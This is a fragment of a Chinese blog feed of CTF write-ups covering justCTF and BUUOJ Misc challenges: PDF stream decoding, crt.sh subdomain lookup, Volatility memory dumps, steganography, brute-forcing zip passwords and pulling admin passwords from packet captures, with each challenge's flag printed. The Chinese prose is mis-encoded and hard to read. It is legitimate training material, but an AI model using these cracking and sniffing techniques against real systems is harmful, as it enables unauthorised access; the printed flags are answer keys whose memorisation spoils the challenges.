</a>ï¼Œè®²çš„æ˜¯ PDF Streamã€‚è¯»å®Œä¹‹åå›åˆ° PDF æ–‡ä»¶ä¸Šï¼Œæ‰¾ä¸€ä¸‹ PDF æ–‡ä»¶çš„ Streamã€‚ä»æ¯ä¸€ä¸ªæµçš„å¤´éƒ¨å¯ä»¥æ‰¾åˆ°æµçš„ç±»å‹ï¼Œé•¿åº¦ä»¥åŠè¿‡æ»¤å™¨ã€‚å¦‚æœæ˜¯å›¾ç‰‡ï¼Œè¿˜èƒ½çœ‹åˆ°æ›´å¤šä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214058858571/7b183b16d28c8595a01a0230ddd0a27e77c1c233.png"></p><p>å‚ç…§è¿™ç¯‡<a href="https://www.oreilly.com/library/view/developing-with-pdf/9781449327903/ch01.html">æ–‡ç« </a>å¯çŸ¥ stream å¿…é¡»è¦æœ‰ä¸€ä¸ª generationï¼ŒæŸ¥æ‰¾æµçš„æ—¶å€™å¯ä»¥å‘ç°æœ‰ä¸¤ä¸ªæµä½¿ç”¨äº†åŒä¸€ä¸ª object IDï¼Œä¸åŒçš„ generationï¼Œè€Œè¿™ä¸ªå±æ€§é€šå¸¸ä¸º 0ã€‚æ‰€ä»¥çŒœæµ‹ generation ä¸º 1 çš„ stream ä¸­è—æœ‰ä¸åŒå¯»å¸¸çš„å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059007807/1525865c05e980f081355369d01ddd1da8390b9c.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059130850/c3cc6000e5f88d1f8cb72b4a134c6f01d70097ff.png"></p><p>è¿™ä¸ªåŒºå—çš„ filter æœ‰ <code>[/FlateDecode /ASCIIHexDecode /DCTDecode]</code> è¿™ä¸‰ä¸ªï¼Œå› æ­¤éœ€è¦æå–å‡ºæ¥ä¹‹åå†ä¾æ¬¡è§£ç ï¼Œè¿™é‡Œçš„ FlateDecode å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œæ‰¾åˆ°æœ€è¿‘çš„å—çš„æ–‡ä»¶ï¼Œå³å¯å¾—åˆ° ASCIIHexDecode ä¹‹å‰çš„æ–‡ä»¶ã€‚å°†å…¶ä½¿ç”¨ <code>From Hex</code> è§£ç å³å¯å¾—åˆ°ä¸€å¼  jpg æ–‡ä»¶ã€‚å°†å…¶æ¸²æŸ“å‡ºæ¥æŸ¥çœ‹å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059305807/b26040cd3d4d825c68a41b73475508573db4f2de.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;BytesAreNotRealWakeUpSheeple&#125;</span><br></pre></td></tr></table></figure><h3 id="Forgotten-name"><a href="#Forgotten-name" class="headerlink" title="Forgotten name"></a>Forgotten name</h3><p>åœ¨è¿™ä¸ª<a href="https://crt.sh/">ç½‘ç«™</a>ä¸Šä½¿ç”¨é¡¶çº§åŸŸåæœç´¢å¯ä»¥æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªä¸‰çº§åŸŸåã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059470552/a55a29fa9af79b4d12538d70546b17a0d68c9f62.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;6a7573744354467b633372545f6c34616b735f6f3070737d.web.jctf.pro&#x2F;</span><br></pre></td></tr></table></figure><p>è®¿é—®å®ƒå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OH! You found it! Thank you &lt;3</span><br></pre></td></tr></table></figure><p>å°†æ‰€å¾—åˆ°çš„åŸŸåçš„ç¬¬ä¸€æ®µï¼Œå³ <code>6a7573744354467b633372545f6c34616b735f6f3070737d</code>ï¼Œç»è¿‡ <code>From Hex</code> çš„è§£ç ä¹‹åå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;c3rT_l4aks_o0ps&#125;</span><br></pre></td></tr></table></figure><h3 id="Computeration"><a href="#Computeration" class="headerlink" title="Computeration"></a>Computeration</h3><p>report é¡µé¢æœ‰ä¸€ä¸ªæäº¤ç½‘å€çš„é¡µé¢ï¼Œæäº¤ä¹‹åä¼šæœ‰ bot å»è®¿é—®é¡µé¢ï¼Œå› æ­¤æƒ³åˆ°ç›‘å¬è¯·æ±‚ã€‚ä½¿ç”¨è¿™ä¸ª<a href="https://webhook.site/">ç½‘ç«™</a>ç›‘å¬ä¸€ä¸‹è¯·æ±‚ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059627984/768bf66c82082b698a669b58ff431f15c60eeb90.png"></p><p>å¾ˆå®¹æ˜“å‘ç° referer é‡Œé¢æœ‰ä¸€ä¸ªç½‘å€ï¼Œæ•´ç†ä¸€ä¸‹å¾—åˆ°å¦‚ä¸‹ç½‘å€ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://computeration.web.jctf.pro/b811667a5a09db734093a974111d750e</span><br></pre></td></tr></table></figure><p>å°è¯•è®¿é—®ä¸€ä¸‹å‘ç°è¢«è·³è½¬äº†ã€‚ä½¿ç”¨æŸåœ¨çº¿å·¥å…·è¯·æ±‚ä¸€ä¸‹ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    </span><br><span class="line">    localStorage.setItem(&#39;notes&#39;,JSON.stringify([&#123;</span><br><span class="line">        title:&#39;flag&#39;,</span><br><span class="line">        content:&#39;justCTF&#123;cross_origin_timing_lol&#125;&#39;</span><br><span class="line">    &#125;]));</span><br><span class="line">    </span><br><span class="line">    location &#x3D; (new URL(location.href)).searchParams.get(&#39;url&#39;);</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;cross_origin_timing_lol&#125;</span><br></pre></td></tr></table></figure><h3 id="Remote-Password-Manager"><a href="#Remote-Password-Manager" class="headerlink" title="Remote Password Manager"></a>Remote Password Manager</h3><p>Volatility 2 è·‘ä¸€ä¸‹ imageinfoï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059839653/9c0230bb8a442f9d67f456779c9c9d89dd5e01fe.png"></p><p>æ—¢ç„¶é¢˜ç›®è¯´ Remoteï¼Œé‚£å°±è¦æ‰¾ä¸€ä¸‹è¿œç¨‹çš„ç¨‹åºã€‚å…ˆè·‘ä¸€ä¸‹ pslist çœ‹ä¸€ä¸‹è¿›ç¨‹åˆ—è¡¨ã€‚å¯ä»¥å‘ç°ä¸¤ä¸ªå¯ç–‘è¿›ç¨‹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214059963648/e56244e9c717c932f0f6c4e1a24036e65b43faec.png"></p><p>ä½¿ç”¨ cmdline å…ˆè¯»ä¸€ä¸‹å‘½ä»¤è¡Œçš„å†å²ï¼Œå‘ç°æ²¡æœ‰å€¼å¾—æ·±å…¥çš„åœ°æ–¹ã€‚äºæ˜¯å°† mstsc.exe è¿™ä¸ªè¿›ç¨‹çš„éƒ¨åˆ† dump ä¸‹æ¥ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f challenge.vmem --profile&#x3D;Win10x64_18362 memdump -p 6484 -D .&#x2F;</span><br></pre></td></tr></table></figure><p>æ”¾åˆ° Kali ä¸‹ä½¿ç”¨ GIMP ç›´æ¥æ‰“å¼€ raw dataï¼Œè°ƒæ•´å®½é«˜å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f8f4ba93-7e20-4518-91da-26d067ee93f9/1613214060205861/f1a7ad7cb4184481e7bbeb46b5ebc5a6005d1ef9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justCTF&#123;7h3r3_15_n0_5uch_7h1n6_45_unh4ck4bl3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[Pending] BUUOJ Misc</title>
      <link href="/zh-CN/posts/d24ddcdd.html"/>
      <url>/zh-CN/posts/d24ddcdd.html</url>
      
        <content type="html"><![CDATA[<h3 id="é‡‘ä¸‰èƒ–"><a href="#é‡‘ä¸‰èƒ–" class="headerlink" title="é‡‘ä¸‰èƒ–"></a>é‡‘ä¸‰èƒ–</h3><p>Photoshop æ‰“å¼€åè°ƒå‡ºæ—¶é—´è½´ï¼Œå¯è§ä¸‰å¼ å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213880982856/5ec86ac67fe253bdcc1b4565ef478b6ecea456ca.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881139866/c9aa57b1f6dea4cd74ad285de3921ce145d1147b.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881222910/f5d51543e0c368d187098206e4137990774a6b44.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;he11ohongke&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h3><p>binwalk ä¸€ä¸‹å‘ç°æ–‡ä»¶æœ«å°¾æœ‰å‹ç¼©åŒ…ï¼Œ<code>binwalk -e</code> æå–å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881350455/11ade27ed6e2db98ee54c6bd8a50ba1ab5a0a939.png"></p><p>æ ¹æ® <code>4 number</code> çš„æç¤ºï¼Œä½¿ç”¨ ARCHPR çˆ†ç ´å‹ç¼©åŒ…å¯†ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881523202/18162c62e3811904dbe0cfaf16b6beb942e471fc.png"></p><p>å¾—åˆ°å¯†ç ä¸º 7639ï¼Œè§£å‹å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;vjpw_wnoei&#125;</span><br></pre></td></tr></table></figure><h3 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h3><p>æ²¡æ³•æ­£å¸¸è¿è¡Œçš„ exe æ–‡ä»¶ï¼Œ010 editor æ‰“å¼€ï¼Œå‘ç°åªæ˜¯ä¸€å¼  base64 çš„å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881728647/3f5403f2fee78476ae0d1e5d5b65f240cb43a08d.png"></p><p>è§£ç ä¹‹åå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213881833154/4000a2d34dc8c6f4006adba32e158bb4679c94ab.png" alt="img"></p><p>æ‰«ç å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h3><p>ç”¨ 010 editor æ‰“å¼€å›¾ç‰‡ï¼Œè¿è¡Œæ¨¡æ¿å‘ç° CRC æ ¡éªŒé”™è¯¯ï¼ŒçŒœæµ‹æ˜¯å›¾ç‰‡å®½é«˜è¢«ä¿®æ”¹ã€‚ç”¨è„šæœ¬è·‘å‡ºå®½é«˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;dabai.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x6D7C7135</span>):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°é«˜åº¦åº”ä¸º <code>01 DF</code>ï¼Œå¯¹åº”ä¿®æ”¹å¾—åˆ°åŸå›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882010808/8ce7b52f2566aad597daad5f732788a83fcc40a4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Heql0_d4_ba1&#125;</span><br></pre></td></tr></table></figure><h3 id="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"><a href="#ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°" class="headerlink" title="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"></a>ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°</h3><p>ç”¨ 010 editor æ‰“å¼€å›¾ç‰‡å¯å‘ç°æ–‡ä»¶çš„æœ«å°¾æœ‰ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882110247/c603dfa4ab8bacca805fed06792ad395befe347f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;stego_is_s0_bor1ing&#125;</span><br></pre></td></tr></table></figure><h3 id="åŸºç¡€ç ´è§£"><a href="#åŸºç¡€ç ´è§£" class="headerlink" title="åŸºç¡€ç ´è§£"></a>åŸºç¡€ç ´è§£</h3><p>æ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥å‹ç¼©åŒ…çš„å¯†ç ä¸ºå››ä½æ•°å­—ã€‚ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  2563ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882269292/151131f923bdf8701e3ba48453ce8398c3230fa8.png"></p><p>è§£å‹å¯å¾—åˆ°ä¸€ä¸² base64ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30&#x3D;</span><br></pre></td></tr></table></figure><p>è§£ç å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;70354300a5100ba78068805661b93a5c&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¹Œé•‡å³°ä¼šç§å›¾"><a href="#ä¹Œé•‡å³°ä¼šç§å›¾" class="headerlink" title="ä¹Œé•‡å³°ä¼šç§å›¾"></a>ä¹Œé•‡å³°ä¼šç§å›¾</h3><p>ç”¨ 010 editor æ‰“å¼€å›¾ç‰‡å¯å‘ç°æ–‡ä»¶çš„æœ«å°¾æœ‰ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882379728/408e67ed82854beb7868f6015545b32db73ba793.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</span><br></pre></td></tr></table></figure><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>ä½¿ç”¨ StegSolve è§£å¾— LSB ä¸‹å­˜åœ¨ PNG æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882532022/291bc8b358050b101eda3f20fd57b37bbb9fc3b2.png"></p><p>æå–å‡ºæ¥å¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«æä¹‹åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure><h3 id="å›¾ç‰‡ä¸­çš„ç§˜å¯†"><a href="#å›¾ç‰‡ä¸­çš„ç§˜å¯†" class="headerlink" title="å›¾ç‰‡ä¸­çš„ç§˜å¯†"></a>å›¾ç‰‡ä¸­çš„ç§˜å¯†</h3><p>ç”¨ 010 editor æ‰“å¼€æ–‡ä»¶ï¼Œåœ¨æ•°æ®å¸§ä¸­å¯ä»¥æ‰¾åˆ° flag.</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882641440/cf498a25c4e8622ae931d460a5d247b3ff99b2c6.png" alt=" "></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;870c5a72806115cb5439345d8b014396&#125;</span><br></pre></td></tr></table></figure><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>æ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥å‹ç¼©åŒ…çš„å¯†ç ä¸ºå››ä½æ•°å­—ã€‚ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  8795ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882796706/9598e6b4b14c5ddb7df6c63baf6f466b943cbe03.png"></p><p>è§£å‹å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</span><br></pre></td></tr></table></figure><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>ä½¿ç”¨ wireshark æ‰“å¼€æµé‡åŒ…ï¼Œç­›é€‰ http æ¡ç›®ã€‚æ ¹æ®æç¤ºå¯çŸ¥è¦æ‰¾ç®¡ç†å‘˜å¯†ç ã€‚æ‰¾åˆ°ç™»å½•çš„ POST è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°ç®¡ç†å‘˜å¯†ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213882938136/242558d095b94d177467e9de2d85df990f71a509.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</span><br></pre></td></tr></table></figure><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><p>æ‰«æäºŒç»´ç å¾—å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</span><br></pre></td></tr></table></figure><h3 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œä¿®æ”¹ <code>frFlags</code> å’Œ <code>deFlags</code>ä¸º <code>00</code> å³å¯å»é™¤ä¼ªåŠ å¯†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883055961/bd5ab34a5a9afdf24028924003bb35ef54023616.png" alt=" "></p><p>è§£å‹å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Adm1N-B2G-kU-SZIP&#125;</span><br></pre></td></tr></table></figure><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><p>010 editor æŸ¥çœ‹æ–‡ä»¶å¯çŸ¥æ–‡ä»¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883213009/34eca8c43134bb6dcf905db24483d06efcf38632.png"></p><p><code>binwalk -e</code> åˆ†ç†å‡ºå‹ç¼©åŒ…ï¼Œæ ¹æ®é¢˜ç›®æè¿°çŒœæµ‹ä¸ºå››ä½æ•°å¯†ç ï¼Œç”¨ ARCHPR çˆ†ç ´å¾—å‡ºè§£å‹å¯†ç ä¸º 8368ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883300583/6ac4759653f6e1a81f0811a151b69a22ac8afddc.png"></p><p>è§£å‹å‡ºæ–‡ä»¶å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</span><br></pre></td></tr></table></figure><h3 id="é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a href="#é•œå­é‡Œé¢çš„ä¸–ç•Œ" class="headerlink" title="é•œå­é‡Œé¢çš„ä¸–ç•Œ"></a>é•œå­é‡Œé¢çš„ä¸–ç•Œ</h3><p>StegSolve è§£ LSB éšå†™å¯å¾—ä¿¡æ¯ã€‚<img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883403500/4451c1fce19e1e381805726b7b0cdb35a77b45b2.png" alt=" "></p><p>æå–å‡ºæ¥å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;st3g0_saurus_wr3cks&#125;</span><br></pre></td></tr></table></figure><h3 id="è¢«å—…æ¢çš„æµé‡"><a href="#è¢«å—…æ¢çš„æµé‡" class="headerlink" title="è¢«å—…æ¢çš„æµé‡"></a>è¢«å—…æ¢çš„æµé‡</h3><p>wireshark åˆ†ææµé‡åŒ…ï¼Œç­›é€‰ http æ¡ç›®å¯çœ‹åˆ°ä¸€ä¸ªå›¾ç‰‡çš„ POSTã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883554240/46e75c476cd13e62cafa0941f1e14cf0193831e2.png"></p><p>æå–å‡ºåˆ†ç»„å­—èŠ‚ï¼Œç”¨ 010 editor æ‰“å¼€ï¼Œå¯åœ¨æ–‡ä»¶å°¾éƒ¨çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883653729/d2831b713c3ceb568f49d1d4855df10fa71ed2df.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</span><br></pre></td></tr></table></figure><h3 id="å°æ˜çš„ä¿é™©ç®±"><a href="#å°æ˜çš„ä¿é™©ç®±" class="headerlink" title="å°æ˜çš„ä¿é™©ç®±"></a>å°æ˜çš„ä¿é™©ç®±</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å°¾éƒ¨å‘ç°å‹ç¼©æ–‡æ¡£ã€‚<code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883779129/af82cb17734c319270ee0bea32889574f7aa7a36.png"></p><p>æ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥å‹ç¼©åŒ…çš„å¯†ç ä¸ºå››ä½æ•°å­—ã€‚ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  7869ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213883872899/4a22e6dad04ce66174f915e8d5d7b79d53c464bf.png"></p><p>è§£å‹å‡ºæ–‡ä»¶å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;75a3d68bf071ee188c418ea6cf0bb043&#125;</span><br></pre></td></tr></table></figure><h3 id="çˆ±å› æ–¯å¦"><a href="#çˆ±å› æ–¯å¦" class="headerlink" title="çˆ±å› æ–¯å¦"></a>çˆ±å› æ–¯å¦</h3><p>010 editor æ‰“å¼€è§£å‹çš„å›¾ç‰‡ï¼Œæ–‡ä»¶å°¾éƒ¨å¯ä»¥å‘ç°å‹ç¼©æ–‡æ¡£ã€‚<code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884031620/aced91835881cb2832b06f2424eeeb267453cff0.png" alt=" "></p><p>å‘ç°éœ€è¦è§£å‹å¯†ç ï¼ŒåŒæ—¶åœ¨å›¾ç‰‡çš„å¤‡æ³¨ä¸­æœ‰ <code>this_is_not_password</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884129950/063dff29a52967ab9bc6456a723e19b6babee39b.png"></p><p>å°†å…¶ä½œä¸ºè§£å‹å¯†ç æˆåŠŸè§£å‹æ–‡ä»¶ï¼Œå³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;</span><br></pre></td></tr></table></figure><h3 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h3><p>Wireshark æ‰“å¼€æµé‡åŒ…ï¼Œå‘ç°å…¨æ˜¯ TCP æµï¼Œäºæ˜¯è¿½è¸ª TCP æµï¼Œå¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884247242/f46b2f76eabe15f1e08ad9a4b20242e2bc864011.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;385b87afc8671dee07550290d16a8071&#125;</span><br></pre></td></tr></table></figure><h3 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" 